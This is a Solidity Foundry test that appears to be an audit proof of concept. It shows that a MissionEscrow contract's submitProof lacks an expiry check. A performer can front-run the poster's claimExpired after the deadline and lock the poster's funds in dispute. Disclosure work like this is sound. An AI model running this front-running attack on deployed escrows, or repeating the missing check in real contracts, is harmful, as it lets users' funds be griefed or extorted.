// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/MissionEscrow.sol";
import "../src/DeliveryEscrow.sol";
import "../src/MissionFactory.sol";
import "../src/PaymentRouter.sol";
import "../src/interfaces/IMissionEscrow.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockTokenPoC2 is ERC20 {
    constructor() ERC20("Mock USDC", "mUSDC") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract SubmitProofNotExpiredPoC is Test {
    MissionFactory factory;
    PaymentRouter router;
    MockTokenPoC2 token;
    address poster = address(0x1111);
    address performer = address(0x2222);

    function setUp() public {
        token = new MockTokenPoC2();
        router = new PaymentRouter(address(token), address(1), address(2), address(3), address(this));
        factory = new MissionFactory(address(router));

        token.mint(poster, 10000e6);
        vm.prank(poster);
        token.approve(address(factory), 10000e6);
    }

    function testSubmitProofAfterExpiryExploit() public {
        vm.prank(poster);
        uint256 missionId = factory.createMission(
            address(token),
            100e6,
            block.timestamp + 1 hours,
            address(0),
            bytes32(0),
            bytes32(0)
        );

        address escrowAddr = factory.missions(missionId);
        MissionEscrow escrow = MissionEscrow(escrowAddr);

        vm.prank(performer);
        escrow.acceptMission();

        // Warp past the mission expiry time
        vm.warp(block.timestamp + 2 hours);

        // At this point, the poster expects to be able to call `claimExpired` to retrieve their locked funds.
        // However, a malicious performer can front-run the `claimExpired` transaction by calling `submitProof`.
        // Because `submitProof` lacks the `notExpired` modifier, it succeeds and transitions the state to `Submitted`.
        vm.prank(performer);
        escrow.submitProof(bytes32(uint256(2)));

        // Now, the poster's attempt to claim their expired funds fails because the state is no longer `Accepted`.
        vm.prank(poster);
        vm.expectRevert(IMissionEscrow.InvalidState.selector);
        escrow.claimExpired();

        // This effectively griefs the poster, forcing them to undergo a manual dispute process
        // to retrieve their funds for a task that was not delivered on time,
        // or potentially allowing the performer to extort a settlement.
        IMissionEscrow.MissionRuntime memory runtime = escrow.getRuntime();
        assertEq(uint(runtime.state), uint(IMissionEscrow.MissionState.Submitted));
    }
}
